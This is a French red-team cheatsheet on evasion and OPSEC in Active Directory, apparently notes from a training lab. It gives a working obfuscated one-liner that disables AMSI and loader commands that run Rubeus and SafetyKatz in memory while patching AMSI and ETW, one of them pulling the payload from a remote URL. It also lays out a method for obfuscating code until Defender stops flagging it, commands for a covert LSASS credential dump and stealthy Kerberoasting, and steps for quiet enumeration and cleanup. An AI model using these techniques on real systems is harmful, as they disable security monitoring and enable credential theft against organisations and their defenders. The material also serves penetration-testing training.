# Cheatsheet - Évasion et OPSEC

> [!summary] Objectif
> Rester discret face aux défenses modernes : journalisation PowerShell (transcription, Script Block Logging), AMSI, ETW, Constrained Language Mode, AV/EDR (Defender, MDE) et surveillance côté annuaire (MDI). 
> Le principe : exécuter en mémoire, ne rien écrire sur disque, casser les signatures, neutraliser l'inspection runtime, et préférer les protocoles « normaux » aux downgrades bruyants. 
> Théorie : [[Offensive .NET]], [[What is PowerShell]]. 
> Catalogue : [[Tools list]].

> [!warning]- Required
> La plupart des techniques ci-dessous supposent une exécution de code sur une machine du domaine (session interactive ou WinRM). Les bypass AMSI/ETW et l'InviShell ne demandent aucun privilège admin ; le dump LSASS et le contournement des règles ASR demandent un contexte administrateur local.

### Éviter le logging : InviShell

```cmd
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
```

Lance un PowerShell dont les hooks de journalisation (Script Block Logging, transcription) sont désactivés via des clés de registre utilisateur (aucun droit admin requis). À utiliser avant tout chargement de PowerView / d'outils offensifs.

### Contourner AMSI

```powershell
# One-liner du Lab Manual (patch en mémoire de l'interface AMSI avant tout chargement)
S`eT-It`em ( 'V'+'aR'+'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( get-VariaBle ( '1Q2U'+'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

AMSI (`Antimalware Scan Interface`) soumet tout script/assembly à l'AV *avant* exécution. Le patch force `amsiInitFailed=true` en mémoire → l'inspection est court-circuitée pour la session. La chaîne est volontairement obfusquée pour ne pas être flaggée à l'écriture.

### Charger un outil .NET en mémoire (Loader + patch AMSI/ETW)

```powershell
# Exécute Rubeus depuis un fichier local, jamais écrit tel quel + patch AMSI & ETW
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args <rubeus_args>

# Variante depuis une URL (rien sur disque)
C:\AD\Tools\Loader.exe -path http://<IP>/Rubeus.bin -args <rubeus_args>
```

Le Loader charge l'assembly .NET par réflexion et patche AMSI + ETW au passage. On garde le binaire offensif hors du disque (échappe au scan à l'écriture) ; il ne reste que la signature en mémoire (d'où l'obfuscation) et la télémétrie runtime (neutralisée par le patch ETW).

> [!note] Pourquoi patcher ETW
> ETW (`Event Tracing for Windows`) alimente les EDR en événements .NET/CLR. Sans patch, même un outil chargé en mémoire génère de la télémétrie exploitable. Le patch ETW coupe cette source pour le processus courant.

### Localiser ce qui est détecté

```powershell
# Sur un binaire .NET
C:\AD\Tools\DefenderCheck.exe C:\AD\Tools\Rubeus.exe

# Sur un script PowerShell (ce que déclenche AMSI)
C:\AD\Tools\AMSITrigger\AmsiTrigger_x64.exe -i .\evil.ps1
```

Ces outils renvoient la chaîne / la séquence d'octets précise qui déclenche la détection. Boucle : scanner → modifier la portion flaggée → rescanner → répéter jusqu'à `AMSI_RESULT_NOT_DETECTED`.

### Casser les signatures : obfuscation

```powershell
# Script PowerShell
Import-Module C:\AD\Tools\Invoke-Obfuscation\Invoke-Obfuscation.psd1
Invoke-Obfuscation
```

- **Invoke-Obfuscation** — obfusque un script PowerShell (casse les signatures AMSI/Defender).
- **Codecepticon** — obfusque le *code source* C#/.NET avant compilation (renomme symboles et chaînes).
- **ConfuserEx** — obfusque un *binaire* .NET déjà compilé quand on n'a pas la source.

Voir [[Offensive .NET]] pour le détail obfuscation source vs binaire, et [[Tools list]] pour l'arsenal complet.

### Kerberos : éviter les downgrades bruyants

```powershell
# Ne roaster que les comptes supportant RC4, sans forcer un downgrade détectable
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args kerberoast /rc4opsec /outfile:hashes.txt

# S4U / actions sensibles : mode opsec
... asktgt /user:x /aes256:<key> /opsec
```

Demander un TGS en RC4 sur un compte configuré AES-only déclenche un downgrade visible (event 4769 avec type de chiffrement anormal). `/rc4opsec` ne cible que les comptes réellement RC4 ; `/opsec` évite les requêtes atypiques. Privilégier AES quand on possède la clé.

### Dump LSASS discret + règles ASR

```powershell
# Récupérer le PID de LSASS via API custom plutôt qu'un outil signé/flaggé
C:\AD\Tools\FindLSASSPID.exe

# Dump via Loader + commande OBFUSQUÉE (evasive-*), jamais le .exe brut
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"
```

L'accès direct à `lsass.exe` par `mimikatz.exe` est signé et souvent bloqué par les règles ASR de Defender. Passer par un dump en mémoire (SafetyKatz) et une résolution de PID maison réduit la surface de détection. En présence de MDE, préférer les techniques qui n'ouvrent pas un handle classique sur LSASS.

> [!danger] SafetyKatz n'est PAS un bypass AV
> `SafetyKatz.exe` = mimikatz .NET **moins signaturé**, pas un contournement de Defender. Le lancer **brut** (`SafetyKatz.exe ...` ou via un service) = binaire flaggé → Defender/ASR le choppe (notif). Ce qui te rend évasif = **Loader.exe** (charge en mémoire, patch AMSI+ETW → rien de flaggé sur disque) **+** les commandes renommées **`evasive-keys` / `evasive-lsa` / `evasive-dcsync`** du build du lab **+** bypass AMSI + InviShell.
> Deux défenses distinctes: **AMSI** (scripts, → patch AMSI) ≠ **Defender AV/ASR** (binaires + accès LSASS, → Loader + evasive). Bypasser l'une ne bypasse pas l'autre.

### Énumération furtive

```powershell
# Éviter une collecte SharpHound massive d'un coup
C:\AD\Tools\SharpHound.exe --collectionmethods Session,LocalAdmin --stealth
```

Une collecte `--collectionmethods All` génère un pic de requêtes LDAP très visible (surtout sous MDI). Fractionner les méthodes, utiliser `--stealth`, ou passer par le module AD signé / SOAPHound. Voir [[Énumération AD]].

> [!important] Réflexes OPSEC transverses
> Exécuter en mémoire, jamais de binaire offensif sur disque. Injecter les tickets avec `/ptt` (en mémoire) plutôt que des fichiers `.kirbi` qui traînent. Lancer PowerView sous InviShell. Vérifier une détection avant de la subir (DefenderCheck/AMSITrigger). Préférer AES à RC4 quand on a le choix. Nettoyer les tickets (`klist purge`) après usage.

## Related
- [[Offensive .NET]]
- [[What is PowerShell]]
- [[Cheatsheet - PowerShell]]
- [[Cheatsheet - Post-exploitation]]
- [[Cheatsheet - Monitoring et détections]]
- [[Tools list]]
